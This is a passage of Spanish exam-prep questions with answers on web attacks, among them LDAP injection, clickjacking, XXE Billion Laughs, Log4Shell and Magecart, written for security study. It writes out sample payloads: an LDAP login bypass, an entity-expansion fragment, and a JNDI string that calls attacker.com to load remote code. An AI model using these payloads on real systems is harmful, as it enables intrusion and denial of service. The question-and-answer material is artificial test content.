A) A03 — LDAP Injection; acceso a Active Directory  
B) A08 — Insecure Deserialization; Remote Code Execution  
C) A04 — Insecure Design; bypass de lógica de negocio  
D) A06 — Vulnerable Components; explotar librerías Java desactualizadas  

> **Respuesta correcta: B** — **Insecure Deserialization (A08)**: el atacante inyecta código malicioso en los datos serializados (XML, JSON). Al deserializar, el código se ejecuta sin ser detectado. La consecuencia más grave es **Remote Code Execution (RCE)**. El examen puede presentar esto como "exploiting serialization mechanisms" o "unsafe object deserialization".

---

### Pregunta 4 — Clickjacking
Un atacante crea una página web con un iframe invisible que carga el sitio de redes sociales de la víctima. La víctima, creyendo hacer clic en un botón de "Jugar al juego", realmente hace clic en el botón "Publicar estado" del iframe invisible. ¿Qué técnica de clickjacking es esta?

A) Cropping  
B) Complete Transparent Overlay  
C) Click Event Dropping  
D) Hidden Overlay de 1×1 píxeles  

> **Respuesta correcta: B** — **Complete Transparent Overlay**: la página legítima del sitio real se carga en un iframe con opacidad reducida o cero, superpuesta sobre los elementos clickables de la página maliciosa. La víctima cree estar interactuando con la página maliciosa pero en realidad hace clic en el iframe del sitio legítimo. El header `X-Frame-Options` previene este ataque.

---

### Pregunta 5 — LDAP Injection
Un tester examina el formulario de login de una aplicación que usa LDAP para autenticación. Al introducir `admin)(&)` como nombre de usuario y cualquier contraseña, el login tiene éxito. ¿Por qué funciona este payload?

A) Porque `&` es el operador OR en LDAP que hace la condición siempre verdadera  
B) Porque la query LDAP resultante `(&(USER=admin)(&))` es siempre verdadera, ya que `(&)` con cero argumentos evalúa como TRUE en LDAP  
C) Porque `)` cierra el filtro LDAP y descarta la verificación de contraseña  
D) Porque LDAP no valida el campo de contraseña cuando el username termina en `)`  

> **Respuesta correcta: B** — La query LDAP resultante es `(&(USER=admin)(&))(PASS=blah))`. El servidor LDAP procesa solo el primer filtro `(&(USER=admin)(&))`. El operador `&` (AND) con el subfiltro `(&)` vacío evalúa como TRUE en LDAP, haciendo el login exitoso independientemente de la contraseña.

---

### Pregunta 6 — Same-Site Attack
Un atacante descubre que la empresa objetivo tiene el dominio `company.com` y un subdominio abandonado `old-portal.company.com` que puede ser comprometido. Los usuarios autenticados en `app.company.com` tienen cookies de sesión. ¿Qué ataque puede ejecutar el atacante y qué comparten los sitios del mismo eTLD+1?

A) CSRF directo; los sitios del mismo dominio no comparten cookies  
B) Same-Site Attack; los sitios con el mismo eTLD+1 (`company.com`) comparten cookies, por lo que comprometiendo el subdominio puede obtener cookies de sesión de la aplicación principal  
C) DNS Rebinding; cambia la IP del subdominio para acceder al servidor principal  
D) Subdomain Takeover; solo afecta a los servicios del subdominio comprometido  

> **Respuesta correcta: B** — Los sitios con el **mismo eTLD+1** (en este caso `company.com`) comparten cookies. Al comprometer `old-portal.company.com`, el atacante puede obtener o manipular cookies de `app.company.com`. Esta es la base del **Same-Site Attack** (relacionado con A02 — Cryptographic Failures). Los subdominios abandonados son vectores frecuentes.

---

### Pregunta 7 — RC4 NOMORE Attack
Un investigador analiza el tráfico HTTPS hacia un servidor web antiguo que usa RC4 como cipher. El investigador captura miles de peticiones que reutilizan la misma cookie de sesión. ¿Qué ataque puede usar esta información?

A) KRACK Attack; explota RC4 en el nivel de enlace inalámbrico  
B) RC4 NOMORE Attack; usa análisis estadístico de múltiples capturas del mismo plaintext para descifrar la cookie  
C) Sweet32 Attack; explota colisiones en cifrados de 64-bit como RC4  
D) BEAST Attack; explota RC4 en la capa de transporte TLS 1.0  

> **Respuesta correcta: B** — **RC4 NOMORE (Numerous Occurrence MOnitoring and Recovery Exploit)**: ataca el cifrado RC4 en HTTPS. Cuando el mismo plaintext (cookie) se cifra múltiples veces con RC4, el análisis estadístico de los biastes del keystream permite recuperar el plaintext (la cookie). El atacante fuerza al navegador a enviar la cookie miles de veces y analiza los patrones. Categoría OWASP: A02.

---

### Pregunta 8 — MarioNet Attack
Un analista detecta que varios equipos de la empresa siguen generando tráfico hacia `evil.com` incluso después de que los usuarios cerraron las pestañas del navegador que habían visitado ese dominio. Los procesos del navegador están activos pero sin ventanas visibles. ¿Qué ataque explica este comportamiento?

A) Browser-Based Timing Attack  
B) MarioNet Attack; usa Service Workers API que persiste incluso después de cerrar la pestaña  
C) Drive-by Download con malware persistente instalado en el sistema  
D) Watering Hole Attack con backdoor embebido en el sitio  

> **Respuesta correcta: B** — **MarioNet Attack** registra **Service Workers** en el navegador mediante la API correspondiente. Los Service Workers se ejecutan en background y **persisten después de cerrar la pestaña o el sitio malicioso**, abusando del SyncManager interface. No instalan malware en el sistema; operan en el contexto del navegador. Usos: botnet, cryptojacking, DDoS.

---

### Pregunta 9 — XXE y Billion Laughs
Un servidor XML recibe el siguiente documento y el servidor se cuelga con uso de CPU y memoria al 100%: `<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">` ... `<foo>&lol9;</foo>`. ¿Qué vulnerabilidad y ataque representa esto?

A) A03 — SQL Injection embebida en XML  
B) A05 — XXE Attack en variante Billion Laughs (DoS por expansión exponencial de entidades)  
C) A08 — Insecure Deserialization del documento XML  
D) A04 — Insecure Design; timing attack via XML  

> **Respuesta correcta: B** — **Billion Laughs Attack**: variante de **XXE (XML External Entity)** que causa **DoS** mediante expansión exponencial de entidades XML anidadas. Cada nivel de entidad se expande N veces, resultando en billones de caracteres en memoria. Categoría OWASP: **A05 — Security Misconfiguration** (parser XML no configurado para limitar expansión de entidades).

---

### Pregunta 10 — JNDI Injection / Log4Shell
Una aplicación Java usa el framework de logging. Un investigador descubre que si introduce `${jndi:ldap://attacker.com/exploit}` como valor del campo "User-Agent", el servidor Java hace una petición LDAP al servidor del atacante y ejecuta la clase Java descargada. ¿Qué mecanismo subyacente lo permite?

A) SSRF; el servidor hace peticiones HTTP en nombre del atacante  
B) JNDI Injection; el resolver de JNDI busca `classFactoryLocation` como URL si no encuentra el objeto localmente, descargando y ejecutando bytecode remoto  
C) Command Injection; `${...}` es interpretado como comando de shell  
D) Insecure Deserialization; el log serializa el User-Agent y lo deserializa  

> **Respuesta correcta: B** — **JNDI (Java Naming and Directory Interface) Injection**: cuando `classFactory` no se encuentra localmente, Java resuelve `classFactoryLocation` como URL y descarga el bytecode desde esa URL → **Remote Code Execution**. Esta es la base de **Log4Shell (CVE-2021-44228)**. El examen puede presentarlo sin nombrar Log4Shell explícitamente.

---

### Pregunta 11 — Magecart Attack
Un equipo de seguridad de una tienda online detecta que los datos de tarjetas de crédito de clientes están siendo robados durante el checkout, pero no hay malware en los servidores de pago propios. Tras investigar, encuentran código JavaScript malicioso en el widget de chat de un proveedor de terceros integrado en su web. ¿Qué tipo de ataque es este?

A) SQL Injection en la base de datos de pagos  
B) Magecart Attack (web skimming); JavaScript malicioso en componentes de terceros exfiltra datos de tarjeta en el checkout  
C) Watering Hole Attack; el proveedor de chat fue comprometido para distribuir malware  
D) XSS Stored; el JS malicioso fue inyectado en el campo de comentarios  

> **Respuesta correcta: B** — **Magecart Attack**: el atacante compromete un **plugin o componente de terceros** (widget de chat, librería de analytics) integrado en el sitio de e-commerce. El JS malicioso se activa durante el checkout, captura los datos de tarjeta **antes de enviarlos al procesador de pagos**, y los exfiltra al servidor del atacante. Categoría OWASP: A08 y A06.

---

### Pregunta 12 — Pass-the-Cookie Attack
Un investigador de seguridad accede a una aplicación web sin conocer las credenciales del usuario. Lo hace extrayendo las cookies de autenticación del navegador usando una herramienta como Mimikatz y reproduciéndolas en otro navegador. ¿Qué vulnerabilidad categoría OWASP explica esta vulnerabilidad y cuál es la defensa más efectiva?

A) A07 — Authentication Failures; defensa: cookies HttpOnly + Secure + SameSite=Strict + corta expiración  
B) A01 — Broken Access Control; defensa: implementar autorización basada en roles  
C) A02 — Cryptographic Failures; defensa: cifrar las cookies con AES-256  
D) A09 — Logging Failures; defensa: auditar todos los accesos de cookies  

> **Respuesta correcta: A** — **Pass-the-Cookie Attack** cae en **A07 — Identification and Authentication Failures**. La cookie de sesión se usa para suplantar al usuario autenticado. Defensas: `HttpOnly` (previene acceso JS), `Secure` (solo HTTPS), `SameSite=Strict` (previene CSRF/cookie forwarding), y una vida de sesión corta. El cifrado de la cookie (C) no ayuda porque el atacante la usa tal cual.

